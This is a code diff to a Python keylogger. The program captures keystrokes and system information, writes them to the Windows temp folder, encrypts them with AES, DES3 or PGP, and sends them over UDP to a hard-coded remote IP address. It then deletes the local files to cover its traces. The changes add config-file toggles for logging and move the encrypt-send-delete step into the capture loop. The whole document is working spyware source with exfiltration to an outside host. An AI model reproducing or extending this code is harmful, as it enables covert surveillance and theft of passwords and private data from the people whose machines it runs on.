@@ -31,18 +31,39 @@ systemInfoEncrypted = "systemInfoEncrypted.txt"
 ## Networking Variables
 udpPort = 25005
 buffer_size = 1024
-server_ip = "35.231.244.179"  # local testing
+server_ip = "35.231.244.179"  # static ip addr
 
 # payload destination variables
 path = "C:\Windows\Temp"
 extend = "\\"
 extendedPath = path + extend
 
+#config variables
+name = ""
+key = ""
+syslog = False
+keylog = False
+email = "example@mail.com"
+
 # varubales for AES:
 BS = 16
 PAD = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS).encode('utf-8')
 UNPAD = lambda s: s[:-ord(s[len(s) - 1:])]
 BLOCK_SIZE = 128
+
+def setupConfig():
+    global name
+    global key
+    global syslog
+    global keylog
+    f = open("./config.txt")
+    config = f.readlines()
+    name = config[0]
+    if config[1] == '1':
+        syslog = True
+    if config[2] == '1':
+        keylog = True
+    key = config[3]
 
 
 ### ESTABLISH HOW/WHERE ENCRYPTED FILES WILL BE SENT HERE ###
@@ -119,8 +140,10 @@ def getSystemInfo():
             f.write("ERROR: could not retrieve processor info" + '\n')
 
 
-# gets system info and writes to file
-getSystemInfo()
+# gets info from config file
+setupConfig()
+if (syslog):
+    getSystemInfo()
 
 ### Run Length Variables ###
 numberOfLogs = 1
@@ -178,7 +201,7 @@ while currentTime < endTime:
     with Listener(onPress=onPress, onRelease=onRelease) as listener:
         listener.join()
 
-    if currentTime > endTime:
+    if currentTime >= endTime:
         # needs error handling
         with open(extendedPath + loggedKeys, "w") as f:
             f.write()
@@ -187,6 +210,9 @@ while currentTime < endTime:
 
         currentTime = time.time()
         endTime = time.time() + logTime
+
+        #encrypt
+        encryptions(key, name, email, syslog, keylog)
 
 
 ### ENCRYPT FILES HERE ###
@@ -220,12 +246,16 @@ def encryptions(key, name, email, system, keylogger):
             if name == "PGP":
                 systemencrypted_file_names[count] = encrypt_gnupg(email, key, encryptingFile,
                                                                   keylogger_encrypt_filename[count])
-            sendFile(keylogger_encrypt_filename[count], True)
+            sendFile(keylogger_encrypt_filename[count], False)
         count += 1
+    ### Deletes Files After they are Encrypted and Sent ###
+    deleteFiles = [systemInfo, loggedKeys]
+    for file in deleteFiles:
+        os.remove(extendedPath + file)
 
 
 ### ENCRYPT FILES HERE ###
-# PGP encryption
+# des3 encryption
 
 # encrypt files
 def des3_encrypt(key, filelist_encrypt):
@@ -294,7 +324,4 @@ def encrypt_gnupg(email, key, file_to_encrypt, encrypted_file):
 #     time.sleep(120)
 
 
-### Deletes Files After they are Encrypted and Sent ###
-deleteFiles = [systemInfo, loggedKeys]
-for file in deleteFiles:
-    os.remove(extendedPath + file)
+
